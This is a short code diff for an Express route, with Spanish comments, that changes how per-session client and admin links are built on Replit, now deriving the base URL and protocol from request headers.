@@ -811,12 +811,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
       
       // Armamos los enlaces para ambos dominios
+      // Obtenemos la URL actual de la solicitud para generar enlaces relativos en Replit
+      const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
+      const protocol = req.headers['x-forwarded-proto'] || 'https';
+      
       // Usamos el formato numérico directamente (sin "client/") en la URL
       const clientLink = isReplit 
-        ? `https://${process.env.REPL_SLUG}.replit.dev/${sessionId}` 
+        ? `${protocol}://${baseUrl}/${sessionId}` 
         : `https://${clientDomain}/${sessionId}`;
       const adminLink = isReplit 
-        ? `https://${process.env.REPL_SLUG}.replit.dev` 
+        ? `${protocol}://${baseUrl}` 
         : `https://${adminDomain}`;
 
       console.log(`Nuevo enlace generado - Código: ${linkCode}, Banco: ${banco}`);
